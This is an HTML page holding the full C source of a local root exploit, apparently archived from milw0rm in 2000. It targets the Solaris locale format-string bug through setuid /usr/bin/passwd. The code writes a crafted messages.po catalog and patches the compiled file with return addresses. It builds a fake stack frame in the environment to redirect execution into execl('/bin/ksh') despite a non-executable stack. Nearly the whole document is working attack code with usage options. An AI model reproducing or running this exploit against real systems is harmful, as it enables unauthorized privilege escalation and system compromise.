<html><head><title>Solaris locale Format Strings (noexec stack) Exploit</title></head><pre>/*
 * exploit for locale subsystem format strings bug In Solaris with noexec stack.
 * Tested in Solaris 2.6/7.0 (If it wont work, try adjust retloc offset. e.g. 
 * ./ex -o -4 )
 *
 * $gcc -o ex ex.c `ldd /usr/bin/passwd|sed -e 's/^.lib\([_0-9a-zA-Z]*\)\.so.*/-l\1/'`
 * usages: ./ex -h
 *
 * Thanks for Ivan Arce &lt;iarce@core-sdi.com&gt; who found this bug.
 * Thanks for horizon's great article about defeating noexec stack for Solaris.
 *
 * THIS CODE IS FOR EDUCATIONAL PURPOSE ONLY AND SHOULD NOT BE RUN IN
 * ANY HOST WITHOUT PERMISSION FROM THE SYSTEM ADMINISTRATOR.
 *
 *     by warning3@nsfocus.com (http://www.nsfocus.com)
 *             y2k/11/10
 */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/systeminfo.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;dlfcn.h&gt;

#define BUFSIZE 2048			/* the size of format string buffer	*/
#define BUFF    128			/* the progname buffer size		*/
#define SHELL   &quot;/bin/ksh&quot;		/* shell name				*/
#define DEFAULT_NUM 68			/* format strings number		*/
#define DEFAULT_RETLOC 0xffbefb44	/* default retloc address		*/
#define VULPROG  &quot;/usr/bin/passwd&quot;	/* vulnerable program name		*/

void usages(char *progname)
{
  int i;
  printf(&quot;Usage: %s \n&quot;, progname);
  printf(&quot;    [-h]       Help menu\n&quot;);
  printf(&quot;    [-n number]      format string's number\n&quot;);
  printf(&quot;    [-a align]       retloc buffer alignment\n&quot;);
  printf(&quot;    [-o offset]      retloc offset\n\n&quot;);

}

/* get current stack point address to guess Return address */
long get_sp(void)
{
  __asm__(&quot;mov %sp,%i0&quot;);
}

main( int argc, char **argv )
{
  char *pattern, retlocbuf[BUFF], *env[11];
  char plat[BUFF], *ptr;
  long sh_addr, sp_addr, i;
  long retloc = DEFAULT_RETLOC, num = DEFAULT_NUM,  align = 0, offset=0;
  long  *addrptr;
  long reth, retl, reth1, retl1;
  FILE *fp;
  

  extern int optind, opterr;
  extern char *optarg;
  int opt;

  void *handle;
  long execl_addr, fp_addr, fp1_addr;
  char fakeframe[512];
  char padding[64], pad = 0;
  int env_len, arg_len, len;

  char progname[BUFF];
  strncpy(progname, argv[0], BUFF-1);

  while ((opt = getopt(argc, argv, &quot;n:a:o:h&quot;)) != -1)
    switch((char)opt)
    {

      case 'n':
        num = atoi(optarg);
        break;

      case 'a':
        align = atoi(optarg);
        break;
      case 'o':
        offset = atoi(optarg);
        break;
      case '?':
      case 'h':
      default:
        usages(progname);
        exit(0);
    }

  retloc +=  offset;
  
  /* get platform info  */
  sysinfo(SI_PLATFORM,plat,256);

  /* Construct fake frame in environ */
  
  env[0] = &quot;NLSPATH=:.&quot;;
  env[1] = padding;      /* padding so that fakeframe's address can be divided by 4 */
  /* sh_addr|sh_addr|0x00000000|fp2|fp2|fp2|fp2|fp2|0x00|/bin/ksh|0x00 */
  env[2]=(fakeframe);     /* sh_addr|sh_addr|0x00           */
  env[3]=&amp;(fakeframe[40]);/*         |0x00      */
  env[4]=&amp;(fakeframe[40]);/*        |0x00       */
  env[5]=&amp;(fakeframe[40]);/*             |0x00  */
  env[6]=&amp;(fakeframe[44]);/*            |fp2|fp2|fp2|fp2|fp2*/
  env[7]=SHELL;     /* shell strings */
  env[8]=NULL;

  /* calculate the length of &quot;VULPROG&quot; + argv[1] */
  arg_len = strlen(VULPROG) + strlen(&quot;-z&quot;) + 2;

  /* calculate the pad nummber .
   * We manage to let the length of padding + arg_len + &quot;NLSPATH=.&quot; can
   * be divided by 4. So fakeframe address is aligned with 4, otherwise
   * the exploit won't work.
   */
  pad = 3 - (arg_len + strlen(env[0]) +1)%4;
  memset(padding, 'A', pad);
  padding[pad] = '\0';

  /* get environ length */
  env_len = 0; 
  for(i = 0 ; i &lt; 8 ; i++ )
    env_len += strlen(env[i]) + 1;

 /* get the length from argv[0] to stack bottom 
  *                  
  * +------------------------+-----------+--------+-----------+--------+
  * |argv[0]argv[1]...argv[n]|env0...envn|platform|programname|00000000|
  * +------------------------+-----------+--------+-----------+--------+
  * ^               ^ 
  * |__startaddr                |__sp_addr 
  *
  * &quot;sp_addr&quot; = 0xffbefffc(Solaris 7/8) or 0xeffffffc(Solaris 2.6)
  *
  *  I find &quot;startaddr&quot; always can be divided by 4.
  *  So we can adjust the padding's size to let the fakeframe address
  *  can be aligned with 4.
  *
  * len = length of &quot;argv&quot; + &quot;env&quot; + &quot;platform&quot; + &quot;program name&quot; 
  * if (len%4)!=0, sp_addr - startaddr =  (len/4)*4 + 4
  * if (len%4)==0, sp_addr - startaddr =  len
  * So we can get every entry's address precisely based on startaddr or sp_addr.
  * Now we won't be bored with guessing the alignment and offset.:)
  */
  len = arg_len + env_len + strlen(plat) + 1 
  + strlen(VULPROG) + 1;
  printf(&quot;len = %#x\n&quot;, len);

  /* get stack bottom address */

  sp_addr = (get_sp() | 0xffff) &amp; 0xfffffffc;

  /* fp1_addr must be valid stack address */
  fp1_addr = (sp_addr &amp; 0xfffffac0);

  /* get shell string address */
  sh_addr =  sp_addr - (4 - len%4) /* the trailing zero number */
         - strlen(VULPROG) - strlen(plat)  - strlen(SHELL) - 3 ;

   printf(&quot;SHELL address = %#x\n&quot;, sh_addr);
   
  /* get our fake frame address */
  fp_addr = sh_addr - 8*8 - 1;

  /* get execl() address */
  if (!(handle=dlopen(NULL,RTLD_LAZY)))
  {            
    fprintf(stderr,&quot;Can't dlopen myself.\n&quot;);
    exit(1);
  }
  if ((execl_addr=(long)dlsym(handle,&quot;execl&quot;))==NULL)
  {
    fprintf(stderr,&quot;Can't find execl().\n&quot;);
    exit(1);
  }           
    
  /* dec 4 to skip the 'save' instructure */
  execl_addr -= 4;
  
  /* check if the exec addr includes zero  */
  if (!(execl_addr &amp; 0xff) || !(execl_addr * 0xff00) ||
    !(execl_addr &amp; 0xff0000) || !(execl_addr &amp; 0xff000000))
  {
    fprintf(stderr,&quot;the address of execl() contains a '0'. sorry.\n&quot;);
    exit(1);
  }

  printf(&quot;Using execl() address : %#x\n&quot;,execl_addr);

  /* now we set up our fake stack frame */

  addrptr=(long *)fakeframe;

  *addrptr++= 0x12345678; /* you can put any data in  local registers */
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;

  *addrptr++=sh_addr;      /* points to our string to exec */
  *addrptr++=sh_addr;      /* argv[1] is a copy of argv[0] */
  *addrptr++=0x0;    /* NULL for execl();  &amp;fakeframe[40] */
  *addrptr++=fp1_addr;     /* &amp;fakeframe[44] */
  *addrptr++=fp1_addr;
  *addrptr++=fp1_addr;
  *addrptr++=fp1_addr;     /* we need this address to work  */
  *addrptr++=fp1_addr; /* cause we don't need exec another func,so put garbage here */
  *addrptr++=0x0;

  /* get correct retloc in solaris 2.6(0xefffxxxx) and solaris 7/8 (0xffbexxxx) */
  retloc = (get_sp()&amp;0xffff0000) + (retloc &amp; 0x0000ffff);

  printf(&quot;Using RETloc address = 0x%x,  fp_addr = 0x%x  ,align= %d\n&quot;, retloc, fp_addr, align );

  /* Let's make reloc buffer: |AAAA|retloc-4|AAAA|retloc-2|AAAA|retloc|AAAA|retloc+2|*/

  addrptr = (long *)retlocbuf;

  for( i = 0 ; i &lt; 8 ; i ++ )
    *(addrptr + i) = 0x41414141;
    *(addrptr + 1) = retloc - 4;
    *(addrptr + 3) = retloc - 2;
    *(addrptr + 5) = retloc ;
    *(addrptr + 7) = retloc + 2;

  if((pattern = (char *)malloc(BUFSIZE)) == NULL) {
    printf(&quot;Can't get enough memory!\n&quot;);
    exit(-1);
  }

  /* Let's make formats string buffer: 
   * |A..AAAAAAAAAAAA|%.8x....|%(fp1)c%hn%(fp2)%hn%(execl1)c%hn%(execl2)%hn|  
   */
  ptr = pattern;
  memset(ptr, 'A', 32);
  ptr += 32;

  for(i = 0 ; i &lt; num ; i++ ){
    memcpy(ptr, &quot;%.8x&quot;, 4);
    ptr += 4;
  }

  reth = (fp_addr &gt;&gt; 16) &amp; 0xffff ;
  retl = (fp_addr &gt;&gt;  0) &amp; 0xffff ;
  reth1 = (execl_addr &gt;&gt; 16) &amp; 0xffff ;
  retl1 = (execl_addr &gt;&gt;  0) &amp; 0xffff ;
  

  /* Big endian arch */
  sprintf(ptr, &quot;%%%uc%%hn%%%uc%%hn%%%uc%%hn%%%uc%%hn&quot;,
         (reth - num*8 -4*8 + align ), (0x10000 +  retl - reth),
         (0x20000 + reth1 - retl), (0x30000 + retl1 - reth1));

  if( !(fp = fopen(&quot;messages.po&quot;, &quot;w+&quot;)))
  {
    perror(&quot;fopen&quot;);
    exit(1);
  }
  fprintf(fp,&quot;domain \&quot;messages\&quot;\n&quot;);
  fprintf(fp,&quot;msgid  \&quot;%%s: illegal option -- %%c\\n\&quot;\n&quot;);
  fprintf(fp,&quot;msgstr \&quot;%s\\n\&quot;&quot;, pattern + align);
  fclose(fp);
  system(&quot;/usr/bin/msgfmt -o SUNW_OST_OSLIB messages.po&quot;);

  /* thanks for z33d's idea. 
   * It seems we have to do like this in Solaris 8.
   */
  i=open(&quot;./SUNW_OST_OSLIB&quot;,O_RDWR);
  /* locate the start position of formats strings in binary file*/
  lseek(i, 62, SEEK_SET);
  /* replace the start bytes with our retlocbuf */
  write(i, retlocbuf + align, 32 - align);
  close(i);

  execle(VULPROG, VULPROG, &quot;-z&quot;, NULL, env);
}


// milw0rm.com [2000-11-30]</pre></html>